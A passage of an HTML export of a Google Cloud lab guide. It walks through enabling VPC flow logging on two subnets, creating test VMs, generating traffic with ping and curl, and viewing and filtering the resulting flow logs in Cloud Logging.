68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = &lt;project_id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h4 id='task-1-enable-vpc-flow-logging'><span>Task 1. Enable VPC flow logging</span></h4><p><span>In this task, you enable flow logging for two subnets. Flow logging can also be enabled in exactly the same manner for custom user-defined networks. Flow logging can also be enabled when you create a subnet in one step.</span></p><h5 id='use-gcloud-in-cloud-shell-to-enable-vpc-flow-logging-on-two-subnets'><strong><span>Use gcloud in Cloud Shell to enable VPC flow logging on two subnets</span></strong></h5><ol start='' ><li><p><span>To enable flow logging in two subnets, run the following commands in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets update default \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region us-central1 --enable-flow-logs \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--logging-metadata=include-all</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets update default \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region europe-west4 --enable-flow-logs \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--logging-metadata=include-all</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Notice that you enabled VPC flow logging for the subnets in </span><code>us-central1</code><span> and </span><code>europe-west4</code><span>. None of the other subnets have flow logging enabled.</span></p><ol start='' ><li><p><span>To create three instances in different subnets (to be used for later testing), run the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create default-us-vm \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-central1-c --network=default</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create default-eu-vm \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=europe-west4-a --network=default</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create default-ap-vm \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type e2-micro \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=asia-south1-b --network=default</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> If you get a </span><code>ZONE_RESOURCE_POOL_EXHAUSTED</code><span> error, update the zone in the gcloud command and try running it again. For example, if </span><code>us-central1-a</code><span> is failing, try </span><code>us-central1-b</code><span>instead.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Enable VPC flow logging on subnets and create instances</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-generate-network-traffic-for-testing'><span>Task 2. Generate network traffic for testing</span></h4><p><span>In this task, you create network traffic to test the connectivity between the instances.</span></p><ol start='' ><li><p><span>In the Google Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span> to display a list of VM instances.</span></p></li><li><p><span>Record both the internal and external IP addresses of each instance. You will need these IPs later in this lab.</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><strong><span>Instance</span></strong></th><th style='text-align:left;' ><strong><span>Internal IP</span></strong></th><th style='text-align:left;' ><strong><span>External IP</span></strong></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>default-ap-vm</span></td><td style='text-align:left;' ><code>*****</code></td><td style='text-align:left;' ><code>*****</code></td></tr><tr><td style='text-align:left;' ><span>default-eu-vm</span></td><td style='text-align:left;' ><code>*****</code></td><td style='text-align:left;' ><code>*****</code></td></tr><tr><td style='text-align:left;' ><span>default-us-vm</span></td><td style='text-align:left;' ><code>*****</code></td><td style='text-align:left;' ><code>*****</code></td></tr></tbody></table></figure><ol start='' ><li><p><span>In the row for the </span><code>default-us-vm</code><span> instance, click </span><strong><span>SSH</span></strong><span>.</span></p></li><li><p><span>When connected via SSH, issue the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install -y host</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">host www.wikipedia.org 8.8.8.8</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 5 default-eu-vm.europe-west4-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 5 www.google.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://www.google.com</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>These commands did the following:</span></p><ul><li><p><span>Installed the host DNS resolution utility.</span></p></li><li><p><span>Performed a DNS lookup of </span><a href='http://www.wikipedia.org' target='_blank' class='url'>www.wikipedia.org</a><span> using the 8.8.8.8 DNS server.</span></p></li><li><p><span>Pinged the </span><strong><span>default-eu-vm</span></strong><span> instance and </span><a href='https://www.google.com/'><span>www.google.com</span></a></p></li><li><p><span>Used curl to create an HTTP connection to </span><a href='https://www.google.com/'><span>www.google.com</span></a></p></li></ul><p><span>Next, you run the same commands as above, but instead of pinging the default-eu-vm from the default-us-vm, you ping the default-us-vm from the default-eu-vm.</span></p><ol start='' ><li><p><span>Return to the Cloud Console, and in the row for the </span><code>default-eu-vm</code><span> instance, click </span><strong><span>SSH</span></strong><span>.</span></p></li><li><p><span>When connected via SSH, issue the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install -y host</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">host www.wikipedia.org 8.8.8.8</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 5 default-us-vm.us-central1-c</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 5 cloud.google.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://www.google.com</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Return to the Cloud Console, and in the row for the </span><code>default-ap-vm</code><span> instance, click </span><strong><span>SSH</span></strong><span>.</span></p></li><li><p><span>When connected via SSH, issue the following commands:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install -y host</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">host www.bitnami.com 8.8.8.8</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://www.bitnami.com</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-3-view-flow-logs-in-cloud-logging'><span>Task 3. View flow logs in Cloud Logging</span></h4><p><span>In this task, you view the VPC flow logs for all the projects in Cloud Logging.</span></p><h5 id='access-all-flow-logs'><strong><span>Access all flow logs</span></strong></h5><ol start='' ><li><p><span>In the Cloud Console, go to the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Logging</span></strong><span> &gt; </span><strong><span>Logs Explorer</span></strong><span>. (If you do not see this menu option, then continue this lab, at step 3).</span></p></li><li><p><span>In the </span><strong><span>Query</span></strong><span> panel, under </span><strong><span>All Resource</span></strong><span>, click </span><strong><span>Subnetwork</span></strong><span> and then </span><strong><span>Apply</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>All Log names</span></strong><span>, click </span><strong><span>compute.googleapis.com/vpc_flows</span></strong><span> and then </span><strong><span>Apply</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If no log names appear for the above, try pasting in </span><code>compute.googleapis.com%2Fvpc_flows</code><span> instead.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run query</span></strong><span>.</span></p></li><li><p><span>In the Query results panel, entries from the VPC flow logs appear. If you do not see </span><strong><span>compute.googleapis.com/vpc_flows</span></strong><span>, wait a few minutes for this log type to show up.</span></p></li></ol><p><strong><span>Note:</span></strong><span> This should show all the VPC flow logs for your project. Remember, you only have the flow logs enabled for two of the subnets.</span></p><ol start='' ><li><p><span>Expand one of the log entries.</span></p></li><li><p><span>Within that log entry, expand </span><code>jsonPayload</code><span>, and then expand </span><code>connection</code><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Some entries do not have </span><code>jsonPayload</code><span> fields. You may need to open other entries until you find one that does.</span></p><ol start='' ><li><p><span>Investigate the information about the connection; specifically notice that the port and IP address of both the source and destination have been logged.</span></p></li><li><p><span>Find a log that has </span><code>src_instance</code><span> in </span><code>jsonPayload</code><span>. Investigate the information about this src instance.</span></p></li></ol><p><span>The </span><code>src_instance</code><span> may be one of your instances or an outside IP address if the traffic came from outside your VPC network.</span></p><p><img src="https://cdn.qwiklabs.com/xTE%2FP%2FhkKqxqQUu2KVDKpGWRatK2lpcfp%2Bhs3lzQ%2FaA%3D" referrerpolicy="no-referrer" alt="Source location log with VM Instance field"></p><ol start='' ><li><p><span>Investigate any other information in this log entry or another.</span></p></li></ol><h4 id='task-4-perform-advanced-filtering'><span>Task 4. Perform advanced filtering</span></h4><p><span>In this task, you perform advanced filtering using Query builder. You also explore access logs for specific source or destination IP, and for specific ports and protocols.</span></p><p><span>An advanced logs filter is a Boolean expression that specifies a subset of all the log entries in your project. A few things it can be used for include:</span></p><ul><li><p><span>Choosing log entries for specific VMs.</span></p></li><li><p><span>Choosing log entries for specific source or destination ports.</span></p></li><li><p><span>Choosing log entries for specific source or destination IP address.</span></p></li><li><p><span>Choosing log entries specific protocols.</span></p></li></ul><ol start='' ><li><p><span>Click inside the </span><strong><span>Query</span></strong><span> box.</span></p></li><li><p><span>Remove the current query and paste in the following, replacing </span><code>&lt;INSERT_PROJECT_ID&gt;</code><span> with your Qwiklabs Google Cloud Project ID:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div 